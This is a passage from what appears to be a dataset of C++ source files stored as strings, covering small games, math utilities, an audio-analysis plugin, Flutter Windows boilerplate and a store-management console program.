positions\n         * Lambda function used as comparator\n         */\n        sort(indices.begin(), indices.end(),\n             [&](int lhs, int rhs) { \n                 return positions[lhs] < positions[rhs]; \n             });\n\n        /* [ALGORITHM: Collision Simulation]\n         * Iterate through robots in order of position\n         */\n        for (int currentIndex : indices)\n        {\n            if (directions[currentIndex] == 'R')\n                stack.push(currentIndex); // Add right-moving robots to stack\n            else\n            {\n                /* Process collisions for left-moving robot */\n                while (!stack.empty() && healths[currentIndex] > 0)\n                {\n                    int topIndex = stack.top();\n                    stack.pop();\n\n                    if (healths[topIndex] > healths[currentIndex])\n                    {\n                        /* Right-moving robot survives, left-moving destroyed */\n                        healths[topIndex] -= 1;\n                        healths[currentIndex] = 0;\n                        stack.push(topIndex);\n                    }\n                    else if (healths[topIndex] < healths[currentIndex])\n                    {\n                        /* Left-moving robot survives, right-moving destroyed */\n                        healths[currentIndex] -= 1;\n                        healths[topIndex] = 0;\n                    }\n                    else\n                    {\n                        /* Both robots destroyed */\n                        healths[currentIndex] = 0;\n                        healths[topIndex] = 0;\n                    }\n                }\n            }\n        }\n\n        /* [RESULT COLLECTION]\n         * Collect health of surviving robots\n         */\n        for",
    "#include <SFML/Graphics.hpp>\n\n#include \"Manual.hh\"\n#include \"Location.hh\"\n\nusing namespace sf;\nusing namespace std;\n\nLocation::Location(float given_x, float given_y)\n{\n    if (x < MIN_TILES_NUMBER || y < MIN_TILES_NUMBER || y > MAX_TILES_NUMBER || x > MAX_TILES_NUMBER)\n    {\n        return;\n    }\n    x = given_x;\n    y = given_y;\n}\n\nbool Location::change(float delta_x, float delta_y)\n{\n    if (x < MIN_TILES_NUMBER || y < MIN_TILES_NUMBER || y > MAX_TILES_NUMBER || x > MAX_TILES_NUMBER)\n    {\n        return false;\n    }\n    x = x + delta_x;\n    y = y + delta_y;\n    return true;\n}\n\nint Location::get_x()\n{\n    return x;\n}\n\nint Location::get_y()\n{\n    return y;\n}\n\nbool Location::crash_from_right(Location *second_object)\n{\n    int obj_x=second_object->get_x(), obj_y=second_object->get_y();\n\n    if(x>=obj_x&&x<obj_x+0.5&&y<obj_y+0.1&&y>obj_y-0.1)\n    {\n        return true;\n    }\n    return false;\n}\n\nbool Location::crash_from_left(Location *second_object)\n{\n    int obj_x=second_object->get_x(), obj_y=second_object->get_y();\n\n    if(x<=obj_x&&x>obj_x-0.5&&y<obj_y+0.1&&y>obj_y-0.1)\n    {\n        return true;\n    }\n    return false;\n}\n\nbool Location::contains(Location *second_object)\n{\n    int obj_x=second_object->get_x(), obj_y=second_object->get_y();\n\n    if(x<obj_x+0.5&&x>obj_x-0.5&&y<obj_y+0.5&&y>obj_y-0.5)\n    {\n        return true;\n    }\n    return false;\n}\n",
    "#include \"utils.h\"\n\nEigen::MatrixXf vV3f_to_MXf(const std::vector<Eigen::Vector3f> &data)\n{\n\tEigen::MatrixXf mat(data.size(), 3);\n\tfor (int i = 0; i < data.size(); i++)\n\t{\n\t\tmat.row(i) = data[i];\n\t}\n\treturn mat;\n}\n\nstd::vector<Eigen::Vector3f> MXf_to_vV3f(const Eigen::MatrixXf &data)\n{\n\tstd::vector<Eigen::Vector3f> vec(data.rows());\n\tfor (int i = 0; i < data.rows(); i++)\n\t{\n\t\tvec[i] = data.row(i);\n\t}\n\treturn vec;\n}\n\nEigen::Vector4f Qf_to_V4f(const Eigen::Quaternionf &data)\n{\n\treturn Eigen::Vector4f(data.w(), data.x(), data.y(), data.z());\n}\n\nEigen::Quaternionf V4f_to_Qf(const Eigen::Vector4f &data)\n{\n\treturn Eigen::Quaternionf(data(0), data(1), data(2), data(3));\n}\n\nEigen::MatrixXf vQf_to_MXf(const std::vector<Eigen::Quaternionf> &data)\n{\n\tEigen::MatrixXf mat(data.size(), 4);\n\tfor (int i = 0; i < data.size(); i++)\n\t{\n\t\tmat.row(i) = Qf_to_V4f(data[i]);\n\t}\n\treturn mat;\n}\n\nstd::vector<Eigen::Quaternionf> MXf_to_vQf(const Eigen::MatrixXf &data)\n{\n\tstd::vector<Eigen::Quaternionf> vec(data.rows());\n\tfor (int i = 0; i < data.rows(); i++)\n\t{\n\t\tvec[i] = V4f_to_Qf(data.row(i));\n\t}\n\treturn vec;\n}\n\nTensorXf vM3f_to_TXf(const std::vector<Eigen::Matrix3f> &data)\n{\n\tfloat *p = new float[data.size() * 9];\n\tfor (int i = 0; i < data.size(); i++)\n\t{\n\t\tEigen::Map<Eigen::Matrix3f>(p + i * 9) = data[i].transpose();\n\t}\n\tTensorXf r(\n\t\tstd::vector<ssize_t>({ (ssize_t)data.size(), 3, 3 }),  // shape\n\t\t{ 3 * 3 * sizeof(float), 3 * sizeof(float), sizeof(float) },  // strides\n\t\tp   // data pointer\n\t);\n\tdelete [] p;\n\treturn r;\n}\n\nstd::vector<Eigen::Matrix3f> TXf_to_vM3f(const TensorXf &data)\n{\n\tauto buffer_info = data.request();\n\tfloat *pdata = static_cast<float *>(buffer_info.ptr);\n\tstd::vector<Eigen::Matrix3f> vec(buffer_info.shape[0]);\n\tfor (int i = 0; i < vec.size(); i++)\n\t{\n\t\tvec[i] = Eigen::Map<Eigen::Matrix3f>(pdata + i * 9).transpose();\n\t}\n\treturn vec;\n}\n\n",
    "#include <SFML/Graphics.hpp>\n#include <iostream>\n#include <vector>\n#include <string>\n\n#include \"Location.hh\"\n#include \"Manual.hh\"\n#include \"Portal.hh\"\n\nusing namespace sf;\nusing namespace std;\n\nPortal::Portal(string on_address, string off_address, Location *pos, RenderWindow *window) : pos(pos), window(window)\n{\n    Texture texture;\n    vector<Sprite *> pics = {&off_picture, &on_picture};\n    vector<string> addresses = {off_address, on_address};\n    for (int i = 0; i < 2; i++)\n    {\n        if (!texture.loadFromFile(addresses[i]))\n        {\n            return;\n        }\n        texture.setSmooth(true);\n        pics[i]->setTexture(texture);\n    }\n    state = ON;\n}\n\nvoid Portal::teleport(Location *another_place)\n{\n    another_place->change(pos->get_x() - another_place->get_x(), pos->get_y() - another_place->get_y());\n}\n\nvoid Portal::turn_off_portal()\n{\n    state = OFF;\n}\n\nvoid Portal::draw_portal()\n{\n    vector<Sprite *> pics = {&on_picture, &off_picture};\n    for (int i = 0; i < 2; i++)\n    {\n        if (state == ON && i == 0 || state == OFF && i == 1)\n        {\n            pics[i]->setPosition(sf::Vector2f(pos->get_x() * TILE_SIZE, pos->get_y() * TILE_SIZE));\n            window->draw(*(pics[i]));\n        }\n    }\n}\n\nbool Portal::is_contains(Location * second_obj)\n{\n    if(pos->contains(second_obj))\n    {\n        return true;\n    }\n    return false;\n}\n\nbool Portal::is_in_left(Location * second_obj)\n{\n    return pos->get_x()<second_obj->get_x();\n}\n\nVector2f Portal::give_pos()\n{\n    return Vector2f(pos->get_x(), pos->get_y());\n}\n",
    "/*\n    CHP\n    Copyright (c) 2014 Queen Mary, University of London\n\n    Permission is hereby granted, free of charge, to any person\n    obtaining a copy of this software and associated documentation\n    files (the \"Software\"), to deal in the Software without\n    restriction, including without limitation the rights to use, copy,\n    modify, merge, publish, distribute, sublicense, and/or sell copies\n    of the Software, and to permit persons to whom the Software is\n    furnished to do so, subject to the following conditions:\n\n    The above copyright notice and this permission notice shall be\n    included in all copies or substantial portions of the Software.\n\n    THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n    EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF\n    MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n    NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY\n    CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF\n    CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION\n    WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n*/\n\n#include \"ConstrainedHarmonicPeak.h\"\n\n#include <cmath>\n#include <cstdio>\n#include <climits>\n\nusing std::cerr;\nusing std::endl;\nusing std::vector;\n\nConstrainedHarmonicPeak::ConstrainedHarmonicPeak(float inputSampleRate) :\n    Plugin(inputSampleRate),\n    m_fftSize(0),\n    m_minFreq(0),\n    m_maxFreq(22050),\n    m_harmonics(5)\n{\n}\n\nConstrainedHarmonicPeak::~ConstrainedHarmonicPeak()\n{\n}\n\nstring\nConstrainedHarmonicPeak::getIdentifier() const\n{\n    return \"constrainedharmonicpeak\";\n}\n\nstring\nConstrainedHarmonicPeak::getName() const\n{\n    return \"Frequency-Constrained Harmonic Peak\";\n}\n\nstring\nConstrainedHarmonicPeak::getDescription() const\n{\n    return \"Return the interpolated peak frequency of a harmonic product spectrum within a given frequency range\";\n}\n\nstring\nConstrainedHarmonicPeak::getMaker() const\n{\n    return \"Queen Mary, University of London\";\n}\n\nint\nConstrainedHarmonicPeak::getPluginVersion() const\n{\n    return 1;\n}\n\nstring\nConstrainedHarmonicPeak::getCopyright() const\n{\n    return \"GPL\";\n}\n\nConstrainedHarmonicPeak::InputDomain\nConstrainedHarmonicPeak::getInputDomain() const\n{\n    return FrequencyDomain;\n}\n\nsize_t\nConstrainedHarmonicPeak::getPreferredBlockSize() const\n{\n    return 2048;\n}\n\nsize_t \nConstrainedHarmonicPeak::getPreferredStepSize() const\n{\n    return 512;\n}\n\nsize_t\nConstrainedHarmonicPeak::getMinChannelCount() const\n{\n    return 1;\n}\n\nsize_t\nConstrainedHarmonicPeak::getMaxChannelCount() const\n{\n    return 1;\n}\n\nConstrainedHarmonicPeak::ParameterList\nConstrainedHarmonicPeak::getParameterDescriptors() const\n{\n    ParameterList list;\n\n    ParameterDescriptor d;\n    d.identifier = \"minfreq\";\n    d.name = \"Minimum frequency\";\n    d.description = \"Minimum frequency for peak finding. Will be rounded down to the nearest spectral bin.\";\n    d.unit = \"Hz\";\n    d.minValue = 0;\n    d.maxValue = m_inputSampleRate/2;\n    d.defaultValue = 0;\n    d.isQuantized = false;\n    list.push_back(d);\n\n    d.identifier = \"maxfreq\";\n    d.name = \"Maximum frequency\";\n    d.description = \"Maximum frequency for peak finding. Will be rounded up to the nearest spectral bin.\";\n    d.unit = \"Hz\";\n    d.minValue = 0;\n    d.maxValue = m_inputSampleRate/2;\n    d.defaultValue = 22050;\n    d.isQuantized = false;\n    list.push_back(d);\n\n    d.identifier = \"harmonics\";\n    d.name = \"Harmonics\";\n    d.description = \"Maximum number of harmonics to consider\";\n    d.unit = \"\";\n    d.minValue = 1;\n    d.maxValue = 20;\n    d.defaultValue = 5;\n    d.isQuantized = true;\n    d.quantizeStep = 1;\n    list.push_back(d);\n\n    return list;\n}\n\nfloat\nConstrainedHarmonicPeak::getParameter(string identifier) const\n{\n    if (identifier == \"minfreq\") {\n\treturn m_minFreq;\n    } else if (identifier == \"maxfreq\") {\n\treturn m_maxFreq;\n    } else if (identifier == \"harmonics\") {\n\treturn float(m_harmonics);\n    }\n    return 0;\n}\n\nvoid\nConstrainedHarmonicPeak::setParameter(string identifier, float value) \n{\n    if (identifier == \"minfreq\") {\n\tm_minFreq = value;\n    } else if (identifier == \"maxfreq\") {\n\tm_maxFreq = value;\n    } else if (identifier == \"harmonics\") {\n\tm_harmonics = int(round(value));\n    }\n}\n\nConstrainedHarmonicPeak::ProgramList\nConstrainedHarmonicPeak::getPrograms() const\n{\n    ProgramList list;\n    return list;\n}\n\nstring\nConstrainedHarmonicPeak::getCurrentProgram() const\n{\n    return \"\"; // no programs\n}\n\nvoid\nConstrainedHarmonicPeak::selectProgram(string)\n{\n}\n\nConstrainedHarmonicPeak::OutputList\nConstrainedHarmonicPeak::getOutputDescriptors() const\n{\n    OutputList list;\n\n    OutputDescriptor d;\n    d.identifier = \"peak\";\n    d.name = \"Peak frequency\";\n    d.description = \"Interpolated frequency of the harmonic spectral peak within the given frequency range\";\n    d.unit = \"Hz\";\n    d.sampleType = OutputDescriptor::OneSamplePerStep;\n    d.hasDuration = false;\n    list.push_back(d);\n\n    return list;\n}\n\nbool\nConstrainedHarm",
    "// This is an independent project of an individual developer. Dear PVS-Studio, please check it.\n// PVS-Studio Static Code Analyzer for C, C++, C#, and Java: http://www.viva64.com\n\n#include \"draw_elements.h\"\n\nnamespace imgui_ex\n{\n\tvoid draw_bar_element(const ImVec2& pos, const char* text,\n\t\tconst char* icon, int& tab, int tab_num, ImDrawList* draw_list, const ImVec2& win_pos)\n\t{\n\t\tImGuiContext& g = *GImGui;\n\n\t\tdraw_list->AddText(core::f::icons, u::dpi(10.0f), win_pos + u::dpi(ImVec2(pos.x - 34.0f,\n\t\t\tpos.y + 17.0f)), ImGui::GetColorU32(ImGuiCol_Text), icon);\n\n\t\tauto text_pos = win_pos + u::dpi(pos);\n\t\ttext_pos.y += u::dpi(2);\n\t\tdraw_list->AddText(tab == tab_num ? core::f::dinpro_bold : core::f::dinpro,\n\t\t\tu::dpi(17.0f), text_pos, ImGui::GetColorU32(ImGuiCol_Text), text);\n\n\t\tstd::string label = \"##\" + std::string(text);\n\n\t\tImGui::SetCursorPos(u::dpi(ImVec2(pos.x - 34.0f, pos.y - 2.0f)));\n\n\t\tif (ImGui::InvisibleButton(label.c_str(), u::dpi(ImVec2(100.0f, 25.0f)))\n\t\t\t|| g.DragDropActive && ImGui::IsItemHovered(ImGuiHoveredFlags_AllowWhenBlockedByActiveItem))\n\t\t{\n\t\t\ttab = tab_num;\n\t\t}\n\t}\n\n\tvoid draw_triangle(ImDrawList* draw_list,\n\t\tImVec2 pos1, ImVec2 pos2, ImVec2 pos3)\n\t{\n\t\tImVec2 win_pos = ImGui::GetWindowPos();\n\t\tImU32 col = ImGui::GetColorU32(ImGuiCol_Triangles, ImGui::GetStyle().Alpha);\n\n\t\tdraw_list->AddTriangleFilled(win_pos + u::dpi(pos1), win_pos +\n\t\t\tu::dpi(pos2), win_pos + u::dpi(pos3), col);\n\t}\n\n\tvoid draw_text(ImDrawList* draw_list, const char* text, const ImVec2& pos,\n\t\tImFont* font, float font_size, const char* text_end)\n\t{\n\t\tImVec2 win_pos = ImGui::GetWindowPos();\n\n\t\tdraw_list->AddText(font, u::dpi(font_size), win_pos + pos,\n\t\t\tImGui::GetColorU32(ImGuiCol_Text, ImGui::GetStyle().Alpha), text, text_end);\n\t}\n}",
    "#include <iostream>\n#include <ctime> //for srand which is used to seed the random number generator\nusing namespace std;\n\n//function prototypes\nvoid Draw (char *space);\nvoid PlayerMove (char *spaces, char player);\nvoid ComputerMove (char *spaces, char computer);\nbool CheckWin (char *spaces, char player, char computer);\n\nint main()\n{\n    //create an array of 9 characters to represent the spaces on the board\n    char spaces[9] = {' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '};\n    char player = 'X'; //player is represented by 'X'\n    char computer = 'O'; //computer is represented by 'O'\n    bool run = true;\n    bool isFull = false;\n\n    Draw(spaces); //draw the board with the initial spaces\n\n    while (run) { //while run is true\n        PlayerMove (spaces, player); //player makes a move\n        if (CheckWin (spaces, player, computer)) {\n            run = false;\n            break;\n        }\n        \n        ComputerMove (spaces, computer); //computer makes a move\n        Draw(spaces); //draw the board with the player's move\n        if (CheckWin (spaces, player, computer)) {\n            run = false;\n            break;\n        }\n        \n        for (int i = 0; i < 9; i++) {\n            if (spaces[i] == ' ') {\n                isFull = false;\n                break;\n            }\n            else {\n                isFull = true;\n            }\n        }\n\n        if (isFull) {\n            cout << \"It's a tie!\" << endl;\n            run = false;\n            break;\n            \n        }\n    }\n    return 0;\n}\n\n//function definitions\n\n//function to draw the board with array of spaces\nvoid Draw (char *spaces) {\n    //display the board \n    cout << \"     |     |     \" << endl;\n    cout << \"   \" << spaces[0] << \" | \" << spaces[1] << \"   |   \" << spaces[2] << endl;\n    cout << \"_____|_____|_____\" << endl;\n    cout << \"     |     |     \" << endl;\n    cout << \"   \" << spaces[3] << \" | \" << spaces[4] << \"   |   \" << spaces[5] << endl;\n    cout << \"_____|_____|_____\" << endl;\n    cout << \"     |     |     \" << endl;\n    cout << \"   \" << spaces[6] << \" | \" << spaces[7] << \"   |   \" << spaces[8] << endl;\n    cout << \"     |     |     \" << endl;\n}\nvoid PlayerMove (char *spaces, char player) {\n    int move = -1;\n    while (move < 0 || move > 9) {\n        cout << \"Enter a move (1-9): \"; //prompt the player to enter a move\n        cin >> move; //get the move from the player \n        move--; //decrement the move by 1 to match the index of the array and get out of the loop\n        if (move < 0 || move > 8) {\n            cout << \"Invalid move. Move must be between 1 and 9.\" << endl; //if the move is not between 1 and 9, display an error message\n            move = -1; //set move to -1 to prompt the player to enter a new move\n        }\n        else if (spaces[move] != ' ') {\n            cout << \"Invalid move. Space is already taken.\" << endl; //if the space is already taken, display an error message\n            move = -1; //set move to -1 to prompt the player to enter a new move\n        }\n        else {\n            spaces[move] = player; //set the space to the player's symbol\n            break; //break out of the loop\n        }\n    }\n}\nvoid ComputerMove (char *spaces, char computer) {\n    int move;\n    if (spaces[0] == 'X') {\n        if (spaces[1] == 'X' && spaces[2] == ' ') {\n            spaces[2] = computer;\n            return;\n        }\n        if (spaces[2] == 'X' && spaces[1] == ' ') {\n            spaces[1] = computer;\n            return;\n        }\n        if (spaces[3] == 'X' && spaces[6] == ' ') {\n            spaces[6] = computer;\n            return;\n        }\n        if (spaces[6] == 'X' && spaces[3] == ' ') {\n            spaces[3] = computer;\n            return;\n        }\n        if (spaces[4] == 'X' && spaces[8] == ' ') {\n            spaces[8] = computer;\n            return;\n        }\n        if (spaces[8] == 'X' && spaces[4] == ' ') {\n            spaces[4] = computer;\n            return;\n        }\n    }\n    if (spaces[1] == 'X') {\n        if (spaces[2] == 'X' && spaces[0] == ' ') {\n            spaces[0] = computer;\n            return;\n        }\n        if (spaces[4] == 'X' && spaces[7] == ' ') {\n            spaces[7] = computer;\n            return;\n        }\n    }\n    if (spaces[2] == 'X') {\n        if (spaces[1] == 'X' && spaces[0] == ' ') {\n            spaces[0] = computer;\n            return;\n        }\n        if (spaces[5] == 'X' && spaces[8] == ' ') {\n            spaces[8] = computer;\n            return;\n        }\n        if (spaces[4] == 'X' && spaces[6] == ' ') {\n            spaces[6] = computer;\n            return;\n        }\n    }\n\n    if (spaces[3] == 'X') {\n        if (spaces[0] == 'X' && spaces[6] == ' ') {\n            spaces[6] = computer;\n            return;\n        }\n        if (spaces[6] == 'X' && spaces[0] == ' ') {\n            spaces[0] = computer;\n            return;\n        }\n        if (spaces[4] == 'X' && spaces[5] == ' ') {\n            spaces[5] = computer;\n            return;\n        }\n    }\n    if (spaces[4",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"excuela_test\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"../Include/game.h\"\n#include \"../Include/string_helpers.h\"\n\n#include <SFML/Window/Event.hpp>\n\n\nconst sf::Time Game::TimePerFrame = sf::seconds(1.f / 60.f);\n\nGame::Game()\n\t: mWindow(sf::VideoMode(640, 480), \"World\", sf::Style::Close)\n\t, mFont()\n\t, mStatisticsText()\n\t, mStatisticsUpdateTime()\n\t, mStatisticsNumFrames(0)\n\t, mWorld(mWindow)\n{\n\tmWindow.setKeyRepeatEnabled(false);\n\n\tmFont.loadFromFile(\"Media/Sansation.ttf\");\n\tmStatisticsText.setFont(mFont);\n\tmStatisticsText.setPosition(5.f, 5.f);\n\tmStatisticsText.setCharacterSize(10);\n}\n\nvoid Game::run()\n{\n\tsf::Clock clock;\n\tsf::Time timeSinceLastUpdate = sf::Time::Zero;\n\twhile (mWindow.isOpen())\n\t{\n\t\tsf::Time elapsedTime = clock.restart();\n\t\ttimeSinceLastUpdate += elapsedTime;\n\t\twhile (timeSinceLastUpdate > TimePerFrame)\n\t\t{\n\t\t\ttimeSinceLastUpdate -= TimePerFrame;\n\n\t\t\tprocessInput();\n\t\t\tupdate(TimePerFrame);\n\n\t\t}\n\n\t\tupdateStatistics(elapsedTime);\n\t\trender();\n\t}\n}\n\nvoid Game::processInput()\n{\n\tCommandQueue& commands = mWorld.getCommandQueue();\n\n\tsf::Event event;\n\twhile (mWindow.pollEvent(event))\n\t{\n\t\tmPlayer.handleEvent(event, commands);\n\n\t\tif (event.type == sf::Event::Closed)\n\t\t\tmWindow.close();\n\t}\n\n\tmPlayer.handleRealtimeInput(commands);\n}\n\nvoid Game::update(sf::Time elapsedTime)\n{\n\tmWorld.update(elapsedTime);\n}\n\nvoid Game::render()\n{\n\tmWindow.clear();\n\tmWorld.draw();\n\n\tmWindow.setView(mWindow.getDefaultView());\n\tmWindow.draw(mStatisticsText);\n\tmWindow.display();\n}\n\nvoid Game::updateStatistics(sf::Time elapsedTime)\n{\n\tmStatisticsUpdateTime += elapsedTime;\n\tmStatisticsNumFrames += 1;\n\n\tif (mStatisticsUpdateTime >= sf::seconds(1.0f))\n\t{\n\t\tmStatisticsText.setString(\n\t\t\t\"Frames / Second = \" + toString(mStatisticsNumFrames) + \"\\n\" +\n\t\t\t\"Time / Update = \" + toString(mStatisticsUpdateTime.asMicroseconds() / mStatisticsNumFrames) + \"us\");\n\n\t\tmStatisticsUpdateTime -= sf::seconds(1.0f);\n\t\tmStatisticsNumFrames = 0;\n\t}\n}\n\n\n",
    "#include \"assignment_problem.h\"\n#include \"individual.h\"\n#include \"math_aux.h\"\n\n#include <cmath>\n#include <vector>\n#include<iostream>\n\nusing std::size_t;\nusing std::cos;\n\n// ----------------------------------------------------------------------\n//\t\tCProblemAssignment\n// ----------------------------------------------------------------------\n\nCProblemAssignment::CProblemAssignment(size_t M, size_t k, const std::string& name, double lbs, double ubs) :\n\tBProblem(name),\n\tM_(M),\n\tk_(k)\n{\n\tlbs_.resize( k_, lbs); // lower bound\n\tubs_.resize( k_, ubs); // upper bound \n}\n\n\nbool CProblemAssignment5::Evaluate(CIndividual* indv) const\n{\n\tCIndividual::TDecVec& x = indv->vars();\n\tCIndividual::TObjVec& f = indv->objs();\n\n\tif (x.size() != k_) return false; // #variables does not match\n\n\tf.resize(M_, 0);\n\tfor (size_t i = 1; i < k_; ++i) {\n\tf[0] += -10 * exp(-0.2 * sqrt(MathAux::square(x[i - 1]) + MathAux::square(x[i])));\n\t}\n\tfor (size_t i = 0; i < k_; ++i) {\n\tf[1] += pow(abs(x[i]), 0.8) + 5 * sin(pow(x[i], 3));\n\t}\n\t\n\n\treturn true;\n}\n\n\nbool CProblemAssignment6::Evaluate(CIndividual* indv) const\n{\n\tCIndividual::TDecVec& x = indv->vars();\n\tCIndividual::TObjVec& f = indv->objs();\n\t//std::cout << (x.size() == k_)<<'\\n';\n\tif (x.size() != k_) return false; // #variables does not match\n\n\tf.resize(M_, 0);\n\tf[0] = MathAux::square(x[0]);\n\tf[1] = MathAux::square(x[0] - 2);\n\n\treturn true;\n}\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"finalfluter\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#define _USE_MATH_DEFINES\n#include <cmath>\n#include \"../matplotlibcpp.h\"\n#include \"myfunctions.h\"\n#include <vector>\n#include <complex>\n#include <unordered_map>\n#include <iostream>\n\nnamespace plt = matplotlibcpp;\n#include <opencv2/opencv.hpp>\n\nusing namespace cv;\n\nstd::vector<std::complex<double>> dft(const std::vector<std::complex<double>>& z) {\n  const int N = z.size();\n  std::vector<std::complex<double>> Z(N);\n\n  for (int k = 0; k < N; ++k) {\n    Z[k] = std::complex<double>(0.0, 0.0);\n    for (int n = 0; n < N; ++n) {\n      double theta = 2.0 * M_PI * k * n / N;\n      std::complex<double> wn(std::cos(theta), std::sin(theta));\n      Z[k] += z[n] * wn;\n    }\n    // Normalize (optional for normalized DFT)\n    // Z[k] /= N;\n  }\n\n  return Z;\n}\n\nstd::vector<std::complex<double>> reverseAndConjugate(std::vector<std::complex<double>>& z) {\n  const int N = z.size();\n  std::vector<std::complex<double>> reversedZ(N);\n\n  // Reverse order\n  for (int i = 0; i < N; ++i) {\n    reversedZ[N - i - 1] = z[i];\n  }\n\n  // Take conjugate\n  for (auto& value : reversedZ) {\n    value = std::conj(value);\n  }\n\n  return reversedZ;\n}\n\nint main() \n{\n  // Define parameters\n  const int N = 30;\n  const double fs = 100;\n\n  // Create a vector to store the signal values\n  std::vector<double> x(N);\n\n  // Generate cosine signal\n  for (int i = 0; i < N; ++i) {\n    double t = static_cast<double>(i) / fs;\n    x[i] = std::cos(2.0 * M_PI * 130.0 * t);\n  }\n\n  // Create a vector to store the signal values\n  std::vector<double> y(N);\n\n  // Generate sine signal\n  for (int i = 0; i < N; ++i) {\n    double t = static_cast<double>(i) / fs;\n    y[i] = std::sin(2.0 * M_PI * 180.0 * t);\n  }\n\n  // Create a vector of complex numbers\n  std::vector<std::complex<double>> z(N);\n\n  // Combine x and y into complex numbers\n  for (int i = 0; i < N; ++i) {\n    z[i] = std::complex<double>(x[i], y[i]);\n  }\n\n  // Perform DFT\n  std::vector<std::complex<double>> Z = dft(z);\n\n  // Reverse and conjugate Z\n  std::vector<std::complex<double>> reversedZ = reverseAndConjugate(Z);\n\n  std::vector<double> F_sample;\n  std::vector<double> R_magnitudes;\n  std::vector<std::complex<double>> X(N);\n  for (int i = 0; i < N; ++i) {\n    X[i] = (z[i] + reversedZ[i]) / 2.0;\n\n    F_sample.push_back(i);\n    R_magnitudes.push_back(std::abs(X[i])); \n  }\n\n  std::vector<double> Y_magnitudes;\n  std::vector<std::complex<double>> Y(N);\n  for (int i = 0; i < N; ++i) \n  {\n    Y[i] = (z[i] - reversedZ[i]) / (2.0 * std::complex<double>(0.0, 1.0));\n    Y_magnitudes.push_back(std::abs(Y[i])); \n  }\n\n  plt::plot(F_sample, R_magnitudes);\n    plt::plot(F_sample, Y_magnitudes);\n    plt::title(\"X(F) Y(F)\");\n    plt::xlabel(\"F?\");\n    plt::ylabel(\"X(F) Y(F)\");\n    plt::show();\n\n  return 0;\n}",
    "// Department Store Management System (DSMS) using c++\r\n#include <conio.h>\r\n#include <fstream>\r\n#include <iostream>\r\n#include <stdlib.h>\r\n#include <string>\r\n#include <iomanip>\r\n\r\nusing namespace std;\r\n\r\n// class dept contains main function to perform add,update,\r\n// view and delete operations\r\nclass dept {\r\npublic:\r\n\t// control panel function is called which displays the\r\n\t// options available to\r\n\t// the user\r\n\tvoid control_panel();\r\n\tvoid add_item();\r\n\tvoid display_item();\r\n\tvoid check_item();\r\n\tvoid update_item();\r\n\tvoid delete_item();\r\n};\r\n\r\n// control panel\r\nvoid dept ::control_panel()\r\n{\r\n\t// using the color combination 0A\r\n\tsystem(\"Color 0A\");\r\n\tsystem(\"cls\");\r\n\tcout << \"**********************************************\"\r\n\t\t\t\"**********************************\";\r\n\tcout << \"\\n\\n\\t\\t\\tDepartment Store Management System\";\r\n\tcout << \"\\n\\n\\t\\t\\t\\t Control Panel\\n\";\r\n\tcout << \"\\n********************************************\"\r\n\t\t\t\"************************************\\n\";\r\n\tcout << \"\\n\\n 1. Add New Item\";\r\n\r\n\tcout << \"\\n 2. Display Items\";\r\n\tcout << \"\\n 3. Check Specific Item\";\r\n\r\n\tcout << \"\\n 4. Update Item\";\r\n\r\n\tcout << \"\\n 5. Delete Item\";\r\n\tcout << \"\\n 6. Exit\";\r\n}\r\n\r\n// add item\r\nvoid dept ::add_item()\r\n{\r\n\tsystem(\"cls\");\r\n\t// using the color combination 0A\r\n\tsystem(\"Color 0A\");\r\n\tfstream file;\r\n\tint no_item, Item_Id;\r\n\tstring itm_name;\r\n\tstring c_name;\r\n\tcout << 